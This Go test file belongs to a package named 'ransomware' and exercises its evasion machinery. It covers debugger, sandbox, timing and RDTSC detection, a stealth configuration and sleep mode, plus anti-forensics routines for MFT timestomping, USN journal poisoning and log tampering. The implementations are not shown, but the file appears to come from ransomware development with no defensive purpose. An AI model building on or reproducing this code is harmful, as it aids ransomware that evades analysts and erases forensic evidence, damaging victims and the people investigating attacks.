package ransomware

import (
	"testing"
)

func TestNewAntiReversingEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiReversingEngine(cfg)
	if e == nil {
		t.Fatal("NewAntiReversingEngine() returned nil")
	}
}

func TestAntiReversingIsDebuggerPresent(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiReversingEngine(cfg)
	result := e.IsDebuggerPresent()
	t.Logf("IsDebuggerPresent: %v (expected false in test env)", result)
}

func TestAntiReversingCheckRemoteDebugger(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiReversingEngine(cfg)
	result := e.CheckRemoteDebugger()
	t.Logf("CheckRemoteDebugger: %v (expected false in test env)", result)
}

func TestAntiReversingVerifyIntegrity(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiReversingEngine(cfg)
	ok, stored, computed := e.VerifyIntegrity()
	t.Logf("VerifyIntegrity: ok=%v stored=%d computed=%d", ok, stored, computed)
}

func TestAntiReversingTimingCheck(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiReversingEngine(cfg)
	result := e.TimingCheck()
	t.Logf("TimingCheck: %v", result)
}

func TestAntiReversingRDTSCCheck(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiReversingEngine(cfg)
	result := e.RDTSCCheck()
	if result == 0 {
		t.Log("RDTSCCheck returned 0 (expected in non-native env)")
	}
}

func TestAntiReversingAntiSandboxDetect(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiReversingEngine(cfg)
	result := e.AntiSandboxDetect()
	t.Logf("AntiSandboxDetect: %v", result)
}

func TestAntiReversingMACOUIRandomCheck(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiReversingEngine(cfg)
	result := e.MACOUIRandomCheck()
	t.Logf("MACOUIRandomCheck: %v", result)
}

func TestAntiReversingFullAntiDebugSuite(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiReversingEngine(cfg)
	result := e.FullAntiDebugSuite()
	if result == nil {
		t.Fatal("FullAntiDebugSuite returned nil")
	}
	if len(result) == 0 {
		t.Error("FullAntiDebugSuite returned empty map")
	}
	for k, v := range result {
		t.Logf("  %s: %v", k, v)
	}
}

func TestNewAntiAnalysisEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiAnalysisEngine(cfg)
	if e == nil {
		t.Fatal("NewAntiAnalysisEngine() returned nil")
	}
}

func TestAntiAnalysisIsSandboxed(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiAnalysisEngine(cfg)
	result := e.IsSandboxed()
	t.Logf("IsSandboxed: %v (expected false in test env)", result)
}

func TestAntiAnalysisHasKernelDebugger(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiAnalysisEngine(cfg)
	result := e.HasKernelDebugger()
	t.Logf("HasKernelDebugger: %v", result)
}

func TestAntiAnalysisCheckDebugger(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiAnalysisEngine(cfg)
	result := e.CheckDebugger()
	t.Logf("CheckDebugger: %v", result)
}

func TestAntiAnalysisStealthConfig(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiAnalysisEngine(cfg)
	sc := e.StealthConfig()
	if sc == nil {
		t.Log("StealthConfig returned nil (expected if not configured)")
	} else {
		t.Logf("StealthConfig: %+v", sc)
	}
}

func TestAntiAnalysisEnterSleepMode(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiAnalysisEngine(cfg)
	e.EnterSleepMode(0)
	t.Log("EnterSleepMode(0) completed without panic")
}

func TestNewAntiForensicsAdvanced(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	a := NewAntiForensicsAdvanced(cfg)
	if a == nil {
		t.Fatal("NewAntiForensicsAdvanced() returned nil")
	}
}

func TestAntiForensicsAdvancedFullSuite(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	a := NewAntiForensicsAdvanced(cfg)
	result := a.FullAntiForensicsSuite()
	if result == nil {
		t.Fatal("FullAntiForensicsSuite returned nil")
	}
	for k, v := range result {
		t.Logf("  %s: %v", k, v)
	}
}

func TestMFTTimestomp(t *testing.T) {
	err := MFTTimestomp("/tmp/test_mft_timestomp", 0)
	t.Logf("MFTTimestomp: %v (expected error in non-Windows env)", err)
}

func TestUSNJournalPoison(t *testing.T) {
	err := USNJournalPoison("/tmp/test_usn", 5)
	t.Logf("USNJournalPoison: %v (expected error in non-Windows env)", err)
}

func TestLogToxin(t *testing.T) {
	err := LogToxin("/tmp/test_log_toxin", 3)
	t.Logf("LogToxin: %v (expected error in non-Windows env)", err)
}
